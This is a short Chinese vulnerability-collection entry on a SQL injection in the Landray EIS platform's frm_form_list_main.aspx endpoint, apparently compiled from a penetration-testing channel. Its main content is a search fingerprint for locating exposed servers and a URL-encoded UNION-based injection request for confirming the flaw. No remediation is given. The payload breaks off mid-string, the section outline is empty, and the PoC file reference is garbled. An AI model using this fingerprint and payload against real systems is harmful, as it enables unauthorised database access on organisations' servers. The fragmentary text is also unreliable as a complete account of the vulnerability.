# 蓝凌EIS智慧协同平台frm_form_list_main接口SQL注入漏洞

- **系统**：蓝凌EIS智慧协同平台frm_form_list_main接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.icon=="585275a4cc54b8414554d03e1359a101"`
- **请求**：`GET /frm/frm_form_list_main.aspx?list_id=1%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28`

**请求体 / payload**
```
/frm/frm_form_list_main.aspx?list_id=1

\[蓝凌-EIS-frm-form-list-main-sql注入\_poc.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 蓝凌 EIS智慧协同平台frm\_form\_list\_main接口SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 蓝凌EIS智慧协同办公平台